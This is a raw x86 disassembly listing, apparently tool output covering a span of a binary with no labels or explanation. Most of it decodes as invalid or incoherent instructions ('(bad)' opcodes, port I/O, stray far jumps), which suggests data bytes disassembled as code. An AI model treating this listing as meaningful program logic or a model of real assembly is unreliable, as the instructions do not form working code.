  41562b:	mov    al,0xe1
  41562d:	in     eax,0xe6
  41562f:	in     al,dx
  415630:	rcr    BYTE PTR [edx],0x77
  415633:	cmp    edi,eax
  415635:	scas   al,BYTE PTR es:[edi]
  415636:	(bad)  
  415637:	pand   mm1,QWORD PTR [ecx-0x58]
  41563b:	out    dx,al
  41563c:	icebp  
  41563d:	(bad)
  415642:	fidiv  DWORD PTR [esp+edx*2]
  415645:	adc    bl,BYTE PTR [edx+ebp*8]
  415648:	call   0xc486035a
  41564d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41564e:	sbb    BYTE PTR [ebp-0x7f],0x1c
  415652:	loopne 0x4155f5
  415654:	xor    BYTE PTR [edi-0x6361a40b],bl
  41565a:	mov    cl,0x48
  41565c:	sbb    cl,dh
  41565e:	push   es
  41565f:	cs sub al,0x1c
  415662:	test   al,0x82
  415664:	stc    
  415665:	jae    0x41566b
  415667:	add    dh,BYTE PTR [eax-0x62]
  41566a:	in     al,dx
  41566b:	push   es
  41566c:	scas   eax,DWORD PTR es:[edi]
  41566d:	cmc    
  41566e:	enter  0x7eb9,0x51
  415672:	(bad)  
  415673:	aad    0xd7
  415675:	sub    DWORD PTR [ebp+0x2b],edi
  415678:	test   eax,0xa2080dbe
  41567d:	mov    ebp,0x7a248b2c
  415682:	dec    ecx
  415683:	mov    esi,DWORD PTR [bx+di]
  415686:	mov    edi,0x39175ed7
  41568b:	loopne 0x415693
  41568d:	add    DWORD PTR [edi+0x13],ebp
  415690:	sbb    al,0x48
  415692:	jnp    0x415639
  415694:	mov    esp,0x5c15516b
  415699:	mul    DWORD PTR [edi+0x7618c22d]
  41569f:	pop    ebx
  4156a0:	mov    ch,0xbb
  4156a2:	or     al,0x8b
  4156a4:	jne    0x41563d
  4156a6:	and    eax,0x329ebc90
  4156ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ac:	int    0xba
  4156ae:	and    eax,0xfaa2a57e
  4156b3:	mov    cl,0x95
  4156b5:	push   es
  4156b6:	xchg   edx,eax
  4156b7:	xor    dl,bh
  4156b9:	jb     0x41563d
  4156bb:	jp     0x41563d
  4156bd:	add    ebp,ecx
  4156bf:	std    
  4156c0:	xor    edi,esp
  4156c2:	xor    al,0xa
  4156c4:	pusha  
  4156c5:	add    al,0x8a
  4156c7:	ficom  DWORD PTR [edi+0x5a]
  4156ca:	(bad)  
  4156cb:	and    eax,0x4da09e0b
  4156d0:	lock inc esi
  4156d2:	mov    al,ds:0xa878d127
  4156d7:	inc    ecx
  4156d8:	cmp    eax,0x13c6140f
  4156dd:	clc    
  4156de:	jmp    0x4156df
  4156e0:	jle    0x99daf729
  4156e6:	mov    bl,0xcb
  4156e8:	mov    ds:0x50ecf51d,al
  4156ed:	adc    al,0xb5
  4156ef:	outs   dx,DWORD PTR ds:[esi]
  4156f0:	test   DWORD PTR [eax-0x7371b3db],edx
  4156f6:	int    0x69
  4156f8:	pusha  
  4156f9:	add    DWORD PTR ds:0xe7643308,ebx
  4156ff:	scas   eax,DWORD PTR es:[edi]
  415700:	push   edi
  415701:	inc    ecx
  415702:	arpl   WORD PTR [edi],sp
  415704:	fisubr DWORD PTR [ebx-0x16914f68]
  41570a:	inc    ecx
  41570b:	in     al,0x37
  41570d:	or     BYTE PTR [edx-0x718be8e2],ah
  415713:	adc    al,0xca
  415715:	mov    ah,0xcd
  415717:	or     DWORD PTR [edx-0x17d3f152],esi
  41571d:	mov    cl,0x63
  41571f:	jmp    0x415797
  415721:	adc    BYTE PTR [edi],cl
  415723:	retf   0x101f
  415726:	xchg   ebx,eax
  415727:	pop    ss
  415728:	mov    edx,0xd97f7c66
  41572d:	cmp    BYTE PTR [esi-0x73ef3d82],ch
  415733:	dec    ebp
  415734:	imul   dl
  415736:	mov    cl,0xc8
  415738:	dec    esp
  415739:	adc    BYTE PTR [esi+0x3],cl
  41573c:	sub    edx,ebx
  41573e:	cs push ss
  415740:	dec    ebx
  415741:	lea    esp,[esi-0x1e1e9d8]
  415747:	and    bh,BYTE PTR ds:0xde05ba87
  41574d:	push   ds
  41574e:	sbb    al,0xbc
  415750:	stos   BYTE PTR es:[edi],al
  415751:	test   edi,0x43aae2b9
  415757:	xchg   edx,eax
  415758:	adc    eax,DWORD PTR [ebp+ebx*8-0x14]
  41575c:	cmp    eax,0xef0ca502
  415761:	add    eax,0x990ec91a
  415766:	and    esi,DWORD PTR [eax+esi*8-0xa]
  41576a:	mov    ss:0x52122941,al
  415770:	and    esp,DWORD PTR [ecx-0x2e6cc7e1]
  415776:	in     al,dx
  415777:	mov    ds:0xee26a689,al
  41577c:	jecxz  0x4157c6
  41577e:	add    dl,BYTE PTR [ebp-0x6e17f89b]
  415784:	rol    BYTE PTR ds:0x4567c042,1
  41578a:	ss mov ecx,0x42ea6927
  415790:	adc    DWORD PTR [edi],0xba54e265
  415796:	sub    al,BYTE PTR [ebp-0xd8f85a3]
  41579c:	pop    ecx
  41579d:	xor    ebx,DWORD PTR [esi+edi*1]
  4157a0:	pusha  
  4157a1:	inc    eax
  4157a2:	jbe    0x4157a3
  4157a4:	out    0xbe,al
  4157a6:	mov    bl,0x1d
  4157a8:	cmp    eax,0xd95b66da
  4157ad:	inc    edx
  4157ae:	adc    DWORD PTR [ebx-0x4a],0x7ca83fe8
  4157b5:	cdq    
  4157b6:	pop    ebx
  4157b7:	retf   0x39af
  4157ba:	loop   0x4157d7
  4157bc:	aad    0x57
  4157be:	mov    ecx,0xd6c07461
  4157c3:	dec    edi
  4157c4:	sbb    al,al
  4157c6:	(bad)  
  4157c7:	hlt    
  4157c8:	sub    ah,BYTE PTR [esi+0x5d]
  4157cb:	adc    esp,DWORD PTR cs:[edi]
  4157ce:	adc    al,0xf5
  4157d0:	in     eax,0xf9
  4157d2:	cdq    
  4157d3:	lock shl BYTE PTR [ecx],0x5
  4157d7:	mov    al,0xce
  4157d9:	push   edi
  4157da:	xchg   DWORD PTR [esi+0x7e11d2a5],eax
  4157e0:	pop    es
  4157e1:	mov    esi,0xde411ef
  4157e6:	call   0x3d03:0x1b70ad69
  4157ed:	mov    dl,0xcc
  4157ef:	gs gs (bad) 
  4157f2:	(bad)  
  4157f3:	in     eax,dx
  4157f4:	mov    es,WORD PTR [edx+0x65]
  4157f7:	std    
  4157f8:	das    
  4157f9:	jp     0x415850
  4157fb:	fstp   DWORD PTR [edi-0x8]
  4157fe:	ret    
  4157ff:	mov    ds:0xfe4c2d97,eax
  415804:	cld    
  415805:	ret    
  415806:	jge    0x4157cb
  415808:	lods   al,BYTE PTR ds:[esi]
  415809:	jmp    0x4ca9:0x79ff16fc
  415810:	fidiv  WORD PTR [edi+0x69]
  415813:	jnp    0x4157ff
  415815:	jns    0x415891
  415817:	fidivr WORD PTR [ecx+0x6a]
  41581a:	mov    eax,0xffc9cd16
  41581f:	cmp    eax,0x6f4bc50b
  415824:	mov    DWORD PTR [ecx+0x3c],edx
  415827:	adc    DWORD PTR [eax+0x4ba80d77],ecx
  41582d:	ret    0x4e88
  415830:	cmp    dh,BYTE PTR [ecx-0x57]
  415833:	sahf   
  415834:	cmp    bh,ch
  415836:	mov    ds:0x39375b0e,al
  41583b:	cmp    eax,ebp
  41583d:	loopne 0x4158b4
  41583f:	inc    ebx
  415840:	or     al,0xd1
  415842:	scas   eax,DWORD PTR es:[edi]
  415843:	fisub  DWORD PTR [ebx]
  415845:	and    edi,DWORD PTR [ebx]
  415847:	add    al,0x8b
  415849:	cmp    BYTE PTR [ebx+esi*8],0x25
  41584d:	adc    eax,0x2bc7afa8
  415852:	imul   esi,DWORD PTR [eax+0x31],0x76
  415856:	push   ds
  415857:	push   0x4d
  415859:	or     dl,dl
  41585b:	xchg   esp,eax
  41585c:	add    BYTE PTR [esi],0x7d
  41585f:	test   BYTE PTR [ebx+ecx*2+0x6e272a8c],cl
  415866:	ror    BYTE PTR [edi],0xbf
  415869:	pushf  
  41586a:	add    DWORD PTR [ebp-0x5acb8c4a],0xafd8fd99
  415874:	scas   eax,DWORD PTR es:[edi]
  415875:	sahf   
  415876:	sbb    al,0xd7
  415878:	shl    DWORD PTR [esi+0x6edcf907],cl
  41587e:	aaa    
  41587f:	mov    eax,ds:0x48149dc1
  415884:	inc    esp
  415885:	or     al,BYTE PTR [esi+0x54]
  415888:	rcl    BYTE PTR [edx+eax*1+0x2a],0x41
  41588d:	dec    eax
  41588e:	(bad)  
  41588f:	in     eax,0xf3
  415891:	out    0x39,eax
  415893:	fbstp  TBYTE PTR [edi-0x53fe42fe]
  415899:	cmp    dl,BYTE PTR [ebx-0x12d02622]
  41589f:	lock or ebp,esi
  4158a2:	dec    esp
  4158a3:	mov    ecx,0x83e9ad32
  4158a8:	int    0x83
  4158aa:	mov    ecx,0xcc27d5ae
  4158af:	gs jmp 0xcad5242a
  4158b5:	cs pop ds
  4158b7:	pop    es
  4158b8:	addr16 jbe 0x415862
  4158bb:	sbb    al,0xd2
  4158bd:	sti    
  4158be:	or     al,0x52
  4158c0:	push   edi
  4158c1:	xchg   edx,eax
  4158c2:	push   0x4ce707af
  4158c7:	push   esp
  4158c8:	sbb    al,0x43
  4158ca:	xchg   edx,eax
  4158cb:	and    cl,al
  4158cd:	(bad)
  4158d0:	xor    dh,ah
  4158d2:	lahf   
  4158d3:	mov    al,0x80
  4158d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158d6:	pop    ecx
  4158d7:	ds xchg ebx,eax
  4158d9:	adc    edi,esi
  4158db:	aaa    
  4158dc:	add    eax,0xd57c7985
  4158e1:	cmp    eax,0x5e12d88a
  4158e6:	arpl   WORD PTR ds:0xea7975e6,di
  4158ec:	(bad)  
  4158ed:	shr    DWORD PTR [edi+esi*2+0x5d],1
  4158f1:	xchg   esi,eax
  4158f2:	mov    bh,0x31
  4158f4:	xor    eax,0x79cbbe28
  4158f9:	imul   eax,DWORD PTR [ecx],0x4a
  4158fc:	aas    
  4158fd:	loope  0x415942
  4158ff:	imul   esp,DWORD PTR [ebp+0x18],0xffffff9d
  415903:	cmp    DWORD PTR [esi-0x2e],esp
  415906:	gs ds sbb eax,0x5537b100
  41590d:	outs   dx,BYTE PTR ds:[esi]
  41590e:	mov    al,0x7
  415910:	lock add eax,0x7874a196
  415916:	mov    ebp,0xc6c7f5eb
  41591b:	jecxz  0x41596e
  41591d:	mov    bh,0xe4
  41591f:	pop    edx
  415920:	popf   
  415921:	idiv   ecx
  415923:	stc    
  415924:	shl    eax,0xa4
  415927:	push   ebx
  415928:	in     eax,0x92
  41592a:	test   eax,0xdd583d5e
  41592f:	(bad)  
  415930:	mov    eax,0x882b7d0b
  415935:	sar    BYTE PTR [edx-0x4e],1
  415938:	ret    
  415939:	xchg   ecx,eax
  41593a:	or     al,0xde
  41593c:	adc    esi,DWORD PTR ds:0xb77d5944
  415942:	(bad)  
  415943:	icebp  
  415944:	mov    bl,0x6f
  415946:	mov    ecx,0x2503a1a4
  41594b:	shr    ebp,0x9d
  41594e:	(bad)  
  41594f:	push   ss
  415950:	test   eax,0x68251a1d
  415955:	mov    edx,ds
  415957:	sar    DWORD PTR [ecx-0x4cf2549],0xe1
  41595e:	cwde   
  41595f:	test   DWORD PTR [ecx+0x59],ebp
  415962:	and    eax,0x6fe9159f
  415967:	idiv   al
  415969:	aas    
  41596a:	sub    al,0xb6
  41596c:	xor    DWORD PTR [ebx+0x68ff3f59],ebx
  415972:	ins    BYTE PTR es:[edi],dx
  415973:	inc    esi
  415974:	xor    BYTE PTR [edx-0x4b03d6f4],ch
  41597a:	popf   
  41597b:	mov    BYTE PTR [ecx],0x34
  41597e:	scas   eax,DWORD PTR es:[edi]
  41597f:	xchg   ecx,eax
  415980:	add    DWORD PTR [edi],ecx
  415982:	jb     0x4159ee
  415984:	push   ecx
  415985:	je     0x4159b1
  415987:	add    al,0x4c
  415989:	mov    bl,0x10
  41598b:	shr    DWORD PTR [ecx-0x29afb270],1
  415991:	sti    
  415992:	add    DWORD PTR [ecx+0x317eec80],edi
  415998:	xor    al,0x9d
  41599a:	mov    dl,0x65
  41599c:	cmp    eax,DWORD PTR [esi-0x38]
  41599f:	jmp    0xd864:0x4ccee057
  4159a6:	inc    eax
  4159a7:	sub    ch,dl
  4159a9:	jmp    0x415996
  4159ab:	daa    
  4159ac:	inc    ebp
  4159ad:	(bad)  
  4159ae:	cld    
  4159af:	test   DWORD PTR [ebp-0x3e7c6856],esp
  4159b5:	xor    dl,BYTE PTR [ebx+0x50]
  4159b8:	inc    eax
  4159b9:	or     ecx,DWORD PTR [ecx+edx*2]
  4159bc:	ins    BYTE PTR es:[edi],dx
  4159bd:	fidivr WORD PTR [esi+0x1b29a488]
  4159c3:	in     eax,0xc2
  4159c5:	or     BYTE PTR ds:0x57cbe50,0x8d
  4159cc:	inc    esp
  4159cd:	dec    ebx
  4159ce:	mov    ebp,ebx
  4159d0:	fs mov ebp,0x6fd17390
  4159d6:	clc    
  4159d7:	jmp    0x9f2b462a
  4159dc:	ss mov dl,al
  4159df:	ins    DWORD PTR es:[edi],dx
  4159e0:	mul    DWORD PTR [edx]
  4159e2:	add    edi,DWORD PTR [esi-0x1b913601]
  4159e8:	dec    ecx
  4159e9:	call   0x7c8b8863
  4159ee:	sub    edx,ebx
  4159f0:	adc    esp,DWORD PTR ds:0xec70f8d8
  4159f6:	jae    0x415988
  4159f8:	sbb    cl,bh
  4159fa:	pop    eax
  4159fb:	int3   
  4159fc:	test   DWORD PTR [esi],edx
  4159fe:	or     BYTE PTR [edx+0xea3d602],cl
  415a04:	or     al,0xf7
  415a06:	in     al,dx
  415a07:	loopne 0x41599b
  415a09:	in     eax,dx
  415a0a:	imul   ebp,DWORD PTR [edx],0xffffffe7
  415a0d:	pop    edx
  415a0e:	mov    esp,0x91712e02
  415a13:	daa    
  415a14:	jle    0x4159d0
  415a16:	xor    BYTE PTR [edi-0x251a59cb],0x4d
  415a1d:	xchg   ecx,eax
  415a1e:	test   ebx,0x38440715
  415a24:	(bad)  
  415a25:	int3   
  415a26:	xor    DWORD PTR [ebx],0xd8c57187
  415a2c:	rol    BYTE PTR [ebx-0x546e78c1],cl
  415a32:	pop    ss
  415a33:	sbb    edx,DWORD PTR [edi-0x4e789439]
  415a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a3a:	jp     0x4159c9
  415a3c:	pop    edx
  415a3d:	adc    BYTE PTR [ebp-0x77],bh
  415a40:	and    edi,ecx
  415a42:	sbb    BYTE PTR [edx*4-0x5569c07c],bh
  415a49:	pop    edx
  415a4a:	(bad)  
  415a4b:	lea    edi,[ecx]
  415a4d:	ret    0xa2
  415a50:	in     eax,0xd9
  415a52:	push   DWORD PTR [edx]
  415a54:	addr16 daa 
  415a56:	add    ah,BYTE PTR [esi+0x16]
  415a59:	dec    edx
  415a5a:	out    dx,al
  415a5b:	out    dx,al
  415a5c:	xchg   BYTE PTR [esi+0x202e627f],bl
  415a62:	jnp    0x415a55
  415a64:	and    DWORD PTR [ebx],ecx
  415a66:	inc    esi
  415a67:	lahf   
  415a68:	test   al,0xff
  415a6a:	sub    eax,0xd670b6b0
  415a6f:	std    
  415a70:	sub    ch,BYTE PTR [eax+ecx*8]
  415a73:	lods   eax,DWORD PTR ds:[esi]
  415a74:	repz jl 0x415a97
  415a77:	nop    ebx
  415a7a:	push   ebx
  415a7b:	retf   0xdddc
  415a7e:	push   0xe637e91b
  415a83:	fs push esi
  415a85:	sbb    al,0xd5
  415a87:	xlat   BYTE PTR ds:[ebx]
  415a88:	cmc    
  415a89:	dec    esi
  415a8a:	sub    edx,DWORD PTR [esi]
  415a8c:	call   0xd998:0x301984b4
  415a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a94:	xor    al,0xd1
  415a96:	fld1   
  415a98:	cs inc ebp
  415a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a9b:	loopne 0x415a36
  415a9d:	adc    al,0x8
  415a9f:	stc    
  415aa0:	test   al,0x54
  415aa2:	fst    QWORD PTR [ebx-0x20]
  415aa5:	adc    ah,BYTE PTR [eax]
  415aa7:	push   edi
  415aa8:	loope  0x415a49
  415aaa:	add    al,0xac
  415aac:	push   eax
  415aad:	push   0xffffffa1
  415aaf:	leave  
  415ab0:	aam    0xe9
  415ab2:	and    eax,0x1d4d2555
  415ab7:	js     0x415ab5
  415ab9:	lock add ebx,esi
  415abc:	or     esi,DWORD PTR [eax]
  415abe:	(bad)  
  415abf:	sbb    ch,BYTE PTR [ecx]
  415ac1:	mov    al,ds:0x9134cacd
  415ac6:	cmp    BYTE PTR [ecx-0x31],bh
  415ac9:	hlt    
  415aca:	and    DWORD PTR [ebx+0x2b],edx
  415acd:	mov    ds:0xcbc97d9f,al
  415ad2:	or     eax,DWORD PTR [edi]
  415ad4:	fistp  WORD PTR [edx+0x7f]
  415ad7:	fst    DWORD PTR [eax]
  415ad9:	cld    
  415ada:	stos   BYTE PTR es:[edi],al
  415adb:	arpl   WORD PTR [esi+ebx*4-0x72],cx
  415adf:	fstp   QWORD PTR [ebx+0x41d026bf]
  415ae5:	push   eax
  415ae6:	aas    
  415ae7:	iret   
  415ae8:	dec    eax
  415ae9:	mov    al,ds:0x894d6f95
  415aee:	in     eax,dx
  415aef:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  415af1:	sbb    DWORD PTR [eax],ecx
  415af3:	pop    ecx
  415af4:	push   ss
  415af5:	xchg   esi,eax
  415af6:	imul   ecx,DWORD PTR [ecx+0x83adbcf],0x7c42ec59
  415b00:	mov    eax,ds:0x6b5b08ee
  415b05:	outs   dx,DWORD PTR ds:[esi]
  415b06:	mov    WORD PTR [esp+esi*8-0x21116677],?
  415b0d:	push   cs
  415b0e:	iret   
  415b0f:	push   esp
  415b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b11:	adc    ch,al
  415b13:	inc    ebp
  415b14:	push   esi
  415b15:	sahf   
  415b16:	jae    0x415aa3
  415b18:	adc    esi,esi
  415b1a:	out    dx,eax
  415b1b:	call   0x52fa0546
  415b20:	repz gs adc al,0x95
  415b24:	scas   al,BYTE PTR es:[edi]
  415b25:	(bad)  
  415b26:	fsubr  QWORD PTR [esi]
  415b28:	mov    eax,0x4d421323
  415b2d:	push   ss
  415b2e:	lea    esp,[ecx+0x5f5e8c20]
  415b34:	inc    ebx
  415b35:	sub    eax,0x946d9ab5
  415b3a:	sub    eax,0xac00c3c
  415b3f:	fidiv  DWORD PTR [eax+0x5287d578]
  415b45:	adc    al,0x56
  415b47:	pop    ss
  415b48:	call   0xc70ff6e
  415b4d:	xlat   BYTE PTR ds:[ebx]
  415b4e:	fimul  WORD PTR [edx+0x627a3ebf]
  415b54:	shl    ah,1
  415b56:	pop    ss
  415b57:	mov    esi,0x9a15e15d
  415b5c:	nop
  415b5d:	outs   dx,BYTE PTR ds:[esi]
  415b5e:	xor    al,0xe3
  415b60:	adc    esi,DWORD PTR [ebp-0x15fe1284]
  415b66:	cmp    BYTE PTR [eax],cl
  415b68:	dec    edx
  415b69:	mov    ecx,0xee910cb8
  415b6e:	dec    ebx
  415b6f:	adc    DWORD PTR [edi],0xfeca33ee
  415b75:	leave  
  415b76:	jg     0x415b0a
  415b78:	rcr    DWORD PTR [eax-0x12b22dcb],1
  415b7e:	hlt    
  415b7f:	add    bh,bh
  415b81:	mov    dh,0x70
  415b83:	jp     0x415be3
  415b85:	add    ah,0xa3
  415b88:	hlt    
  415b89:	mov    ebx,0xf9c321b4
  415b8e:	into   
  415b8f:	lods   al,BYTE PTR ds:[esi]
  415b90:	(bad)  
  415b91:	xor    eax,0xb490f796
  415b96:	pop    edx
  415b97:	(bad)  
  415b98:	aas    
  415b99:	fist   DWORD PTR [ecx+ebx*8+0x1c4cf215]
  415ba0:	pop    DWORD PTR [esi+0x2dba0e4f]
  415ba6:	push   ebp
  415ba7:	dec    esi
  415ba8:	mov    ebx,0x4d38cf87
  415bad:	cmp    ah,BYTE PTR [ecx]
  415baf:	mov    cs,WORD PTR [esi+0xafacedf]
  415bb5:	sbb    al,0x4f
  415bb7:	and    eax,0x10872f11
  415bbc:	popa   
  415bbd:	sti    
  415bbe:	test   BYTE PTR [eax+0x6129e6d7],ch
  415bc4:	shl    BYTE PTR [ebp-0x78],0x64
  415bc8:	jo     0x415c43
  415bca:	push   ds
  415bcb:	mov    cl,0x56
  415bcd:	dec    ecx
  415bce:	iret   
  415bcf:	sub    al,cl
  415bd1:	inc    edi
  415bd2:	jmp    0x415bc8
  415bd4:	dec    ebp
  415bd5:	and    BYTE PTR [edi+0x40c8284d],dl
  415bdb:	xchg   ebp,eax
  415bdc:	xchg   edi,eax
  415bdd:	xor    ebx,DWORD PTR [ecx+ebp*4-0x3]
  415be1:	xor    cl,BYTE PTR [eax+0x30f7f077]
  415be7:	or     bh,ah
  415be9:	add    DWORD PTR [edi-0xf6be3e5],esp
  415bef:	shl    DWORD PTR ds:[ecx],0x51
  415bf3:	dec    ecx
  415bf4:	jg     0x415c05
  415bf6:	mov    ah,dl
  415bf8:	adc    al,0x9a
  415bfa:	cmp    BYTE PTR [ebx-0x76eaf10],dh
  415c00:	pop    ecx
  415c01:	loop   0x415bb8
  415c03:	arpl   WORD PTR [ebp+0x58],bp
  415c06:	push   0x49
  415c08:	ret    
  415c09:	loope  0x415b8e
  415c0b:	imul   edx,DWORD PTR [ebp+0x43],0x75
  415c0f:	add    edi,edi
  415c11:	test   DWORD PTR [ebx],ebp
  415c13:	or     bh,dl
  415c15:	dec    edx
  415c16:	push   ebx
  415c17:	sahf   
  415c18:	add    ebp,edi
  415c1a:	add    eax,0xd85212a0
  415c1f:	push   ss
  415c20:	sbb    bl,al
  415c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c23:	push   esi
  415c24:	int3   
  415c25:	in     eax,dx
  415c26:	sub    al,0xd5
  415c28:	rcl    ebp,cl
  415c2a:	xor    ch,cl
  415c2c:	fistp  DWORD PTR ds:0xd3ab0bbe
  415c32:	loope  0x415bee
  415c34:	lods   al,BYTE PTR ds:[esi]
  415c35:	test   al,0x0
  415c37:	sub    BYTE PTR [ecx],ah
  415c39:	cmp    eax,0x13bbd8e4
  415c3e:	idiv   BYTE PTR [ecx+0x7fa830be]
  415c44:	mov    cl,0x72
  415c46:	sub    cl,BYTE PTR [ebx-0x79]
  415c49:	lahf   
  415c4a:	jmp    0xf17e66e0
  415c4f:	repz sbb eax,0xd6d4c127
  415c55:	push   ecx
  415c56:	dec    eax
  415c57:	rcl    BYTE PTR [ecx+0x15],cl
  415c5a:	loopne 0x415c39
  415c5c:	lods   al,BYTE PTR ds:[esi]
  415c5d:	xchg   ebp,eax
  415c5e:	push   eax
  415c5f:	(bad)  
  415c60:	(bad)  
  415c61:	mov    ebp,0xfd04c5be
  415c66:	fldenv [esi-0x7c034df6]
  415c6c:	cmp    al,0xc3
  415c6e:	jecxz  0x415cd1
  415c70:	call   0x2581fb73
  415c75:	add    DWORD PTR [eax+0x7dbd399f],esi
  415c7b:	mov    DWORD PTR [ebp+0x44],0xb7264c4b
  415c82:	xor    bl,BYTE PTR [ecx+0x5f4a78c0]
  415c88:	cld    
  415c89:	jmp    0x415cf9
  415c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c8c:	mov    esp,0x80002197
  415c91:	ss int3 
  415c93:	sbb    bh,BYTE PTR [ebx-0x32]
  415c96:	xor    esi,edi
  415c98:	(bad)  
  415c99:	aas    
  415c9a:	cld    
  415c9b:	dec    eax
  415c9c:	xchg   esi,eax
  415c9d:	adc    edi,DWORD PTR ds:0x4a7d1cf7
  415ca3:	loopne 0x415cb8
  415ca5:	and    bh,ah
  415ca7:	call   0xac41ea06
  415cac:	aad    0x59
  415cae:	add    BYTE PTR [ecx-0x7],bh
  415cb1:	lds    esi,FWORD PTR [ecx+edi*4-0x1d]
  415cb5:	scas   eax,DWORD PTR es:[edi]
  415cb6:	shl    BYTE PTR [esp+ebp*4+0x466d60d7],0xd
  415cbe:	nop
  415cbf:	(bad)  
  415cc0:	bnd jnp 0x415c86
  415cc3:	inc    ebp
  415cc4:	stos   DWORD PTR es:[edi],eax
  415cc5:	(bad)  
  415cc6:	fcmovne st,st(0)
  415cc8:	and    ebx,DWORD PTR [eax-0x38]
  415ccb:	int    0x21
  415ccd:	inc    esi
  415cce:	cwde   
  415ccf:	mov    dl,0x90
  415cd1:	adc    ecx,DWORD PTR [edi+0x4cf8b249]
  415cd7:	xchg   DWORD PTR [edi+0x6ecc68e],esi
  415cdd:	imul   ecx,DWORD PTR [ebp+0x10],0x6712e9f3
  415ce4:	repz mov bl,0x4a
  415ce7:	xchg   ebx,eax
  415ce8:	enter  0x2e8f,0x81
  415cec:	sub    BYTE PTR [edi+0x1c3bb810],0x34
  415cf3:	out    dx,al
  415cf4:	jecxz  0x415d3b
  415cf6:	add    al,0x38
  415cf8:	nop
  415cf9:	stc    
  415cfa:	leave  
  415cfb:	ss xor bl,al
  415cfe:	xchg   ebp,eax
  415cff:	outs   dx,DWORD PTR ds:[esi]
  415d00:	shl    DWORD PTR [ebx+0x384fcd8f],1
  415d06:	jne    0x415cdf
  415d08:	xor    al,0xf8
  415d0a:	pop    DWORD PTR [edi]
  415d0c:	jle    0x415d10
  415d0e:	test   eax,0x98fa53c1
  415d13:	cdq    
  415d14:	xchg   ebp,eax
  415d15:	mov    esp,0x3b74e5f
  415d1a:	out    dx,eax
  415d1b:	push   ebx
  415d1c:	jno    0x415cdb
  415d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d1f:	ret    0xf849
  415d22:	xor    cl,dl
  415d24:	mov    DWORD PTR [ebp-0x76],edx
  415d27:	sub    DWORD PTR [ebx+0x25],esi
  415d2a:	fist   WORD PTR [esp+edi*4-0x45]
  415d2e:	shl    bh,cl
  415d30:	and    ebx,ecx
  415d32:	lods   al,BYTE PTR ds:[esi]
  415d33:	inc    ebp
  415d34:	cdq    
  415d35:	loop   0x415d7b
  415d37:	or     eax,0xe4bbbfa9
  415d3c:	dec    eax
  415d3d:	push   esp
  415d3e:	adc    esp,ebx
  415d40:	xchg   esp,eax
  415d41:	and    al,0x27
  415d43:	or     bh,BYTE PTR [eax-0x5f277f6b]
  415d49:	cmc    
  415d4a:	mov    ds:0xce7dc068,eax
  415d4f:	dec    eax
  415d50:	inc    esp
  415d51:	je     0x415d0d
  415d53:	inc    ecx
  415d54:	imul   esp,DWORD PTR [ebp-0x67],0x4801ab43
  415d5b:	jo     0x415d81
  415d5d:	arpl   WORD PTR [ebx+0x51],bx
  415d60:	push   ebx
  415d61:	lea    ebp,[esi-0x4f]
  415d64:	aaa    
  415d65:	jmp    0x415d94
  415d67:	icebp  
  415d68:	sub    eax,0x5e58c3f4
  415d6d:	xchg   esp,eax
  415d6e:	fisttp DWORD PTR [eax]
  415d70:	aam    0x86
  415d72:	xor    dl,BYTE PTR [edi+0x69]
  415d75:	aam    0x38
  415d77:	and    al,0x29
  415d79:	xchg   DWORD PTR [ebp+0x2f37fafb],eax
  415d7f:	cmc    
  415d80:	ror    BYTE PTR [edi+0x4a],0x23
  415d84:	jecxz  0x415d65
  415d86:	fs retf 0xc77f
  415d8a:	or     BYTE PTR [esi+0x5f],ch
  415d8d:	scas   eax,DWORD PTR es:[edi]
  415d8e:	push   ds
  415d8f:	jle    0x415d2f
  415d91:	mov    ds:0x9df5148c,al
  415d96:	enter  0x847c,0xb2
  415d9a:	cmc    
  415d9b:	sub    eax,DWORD PTR [ecx]
  415d9d:	xor    BYTE PTR [edx+0xf1356d3],ch
  415da3:	test   eax,0x385118f6
  415da8:	loop   0x415d36
  415daa:	dec    ecx
  415dab:	pop    esp
  415dac:	fisubr DWORD PTR fs:[ebx-0xf]
  415db0:	fstp   TBYTE PTR [edx-0x839ca61]
  415db6:	inc    ecx
  415db7:	jl     0x415d80
  415db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dba:	xchg   DWORD PTR [edi-0x41],esp
  415dbd:	aaa    
  415dbe:	cmp    al,0xc4
  415dc0:	(bad)
  415dc3:	jle    0x415d46
  415dc5:	lods   al,BYTE PTR ds:[esi]
  415dc6:	dec    ecx
  415dc7:	add    BYTE PTR [edx-0x61],dh
  415dca:	or     ebp,esp
  415dcc:	mov    al,ds:0x54c72302
  415dd1:	rcl    DWORD PTR [esi],cl
  415dd3:	fld    TBYTE PTR [eax-0x61014957]
  415dd9:	in     eax,dx
  415dda:	sbb    BYTE PTR [esi-0x6d81dcbd],cl
  415de0:	jno    0x415e3c
  415de2:	ds (bad) 
  415de4:	aaa    
  415de5:	sbb    DWORD PTR [eax-0x29e257a6],ebx
  415deb:	fisttp DWORD PTR [ebp+0x44]
  415dee:	in     eax,0xcb
  415df0:	int    0x22
  415df2:	jmp    0x415d82
  415df4:	mov    cl,0xdb
  415df6:	addr16 jle 0x415e41
  415df9:	sub    eax,0xc34903c7
  415dfe:	rcr    BYTE PTR [edi+0x11],0xad
  415e02:	out    dx,eax
  415e03:	jp     0x415deb
  415e05:	out    0xb3,eax
  415e07:	inc    ecx
  415e08:	adc    ecx,edi
  415e0a:	mov    bh,0x57
  415e0c:	lods   eax,DWORD PTR ds:[esi]
  415e0d:	mov    bh,0xd3
  415e0f:	dec    edx
  415e10:	cmc    
  415e11:	dec    esp
  415e12:	call   0x41d0e646
  415e17:	lods   al,BYTE PTR ds:[esi]
  415e18:	addr16 js 0x415e06
  415e1b:	jmp    0x415dfa
  415e1d:	in     eax,dx
  415e1e:	jecxz  0x415e13
  415e20:	mov    ebx,0xf3d31620
  415e25:	sbb    BYTE PTR [edx+0xc],ah
  415e28:	in     eax,0x18
